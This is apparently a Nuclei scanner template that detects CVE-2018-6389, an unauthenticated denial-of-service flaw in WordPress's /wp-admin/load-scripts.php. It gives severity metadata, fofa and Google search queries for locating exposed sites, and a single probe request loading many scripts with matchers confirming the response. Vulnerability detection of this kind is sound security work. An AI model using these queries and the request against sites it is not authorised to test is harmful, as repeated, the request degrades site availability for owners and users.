id: CVE-2018-6389

info:
  name: Script-loader WordPress < 4.9.2 - unauthenticated attackers can cause a denial of service
  author: Chirag Agrawal & Vikas Srivastava
  severity: High
  description: In WordPress versions up to 4.9.2, unauthenticated attackers can exploit a vulnerability to perform a denial-of-service attack by sending multiple requests to load a large number of registered .js files from /wp-admin/load-scripts.php.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-6389
  classification:
   cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
   cvss-score: 7.5
   cve-id: CVE-2018-6389
  metadata:
    fofa-query: "/wp-admin/load-scripts.php?load="
    google-query: inurl:"/wp-admin/load-scripts.php"
  tags: wordpress-misc,cve,wordpress,wp-plugin,high

http:
  - method: GET
    redirects: true
    max-redirects: 3
    path:
      - "{{BaseURL}}/wp-admin/load-scripts.php?load=eutil,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9"
    matchers:
      - type: word
        words:
          - "custom-header.js"
          - "svg-painter.js"
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "\\b(custom-header\\.js|svg-painter\\.js)\\b"
